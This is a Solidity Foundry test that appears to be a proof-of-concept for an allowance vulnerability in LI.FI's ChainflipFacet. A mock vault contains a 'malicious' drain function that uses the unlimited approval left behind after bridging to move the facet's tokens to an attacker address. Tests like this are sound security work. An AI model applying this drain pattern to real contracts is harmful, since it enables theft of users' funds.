// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {ChainflipFacet} from "lifi/Facets/ChainflipFacet.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";
import {IChainflipVault} from "lifi/Interfaces/IChainflip.sol";
import {LibSwap} from "lifi/Libraries/LibSwap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockChainflipVault is IChainflipVault {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function xSwapNative(
        uint32,
        bytes calldata,
        uint32,
        bytes calldata
    ) external payable override {}

    function xSwapToken(
        uint32,
        bytes calldata,
        uint32,
        IERC20 srcToken,
        uint256 amount,
        bytes calldata
    ) external override {
        srcToken.transferFrom(msg.sender, address(this), amount);
    }

    function xCallNative(
        uint32,
        bytes calldata,
        uint32,
        bytes calldata,
        uint256,
        bytes calldata
    ) external payable override {}

    function xCallToken(
        uint32,
        bytes calldata,
        uint32,
        bytes calldata,
        uint256,
        IERC20 srcToken,
        uint256 amount,
        bytes calldata
    ) external override {
        srcToken.transferFrom(msg.sender, address(this), amount);
    }

    // malicious function to drain tokens using remaining allowance
    function drain(address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract ChainflipFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockChainflipVault internal vault;
    ChainflipFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        vault = new MockChainflipVault(address(token));
        facet = new ChainflipFacet(IChainflipVault(address(vault)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 1,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        LibSwap.SwapData[] memory swapData = new LibSwap.SwapData[](0);

        ChainflipFacet.ChainflipData memory cfData = ChainflipFacet.ChainflipData({
            nonEVMReceiver: "",
            dstToken: 1,
            dstCallReceiver: address(0),
            dstCallSwapData: swapData,
            gasAmount: 0,
            cfParameters: ""
        });

        facet.startBridgeTokensViaChainflip(bridgeData, cfData);

        // allowance remains set after bridging
        assertEq(token.allowance(address(facet), address(vault)), type(uint256).max);

        // attacker sends tokens to facet and vault drains them
        token.mint(address(facet), 5 ether);
        vault.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

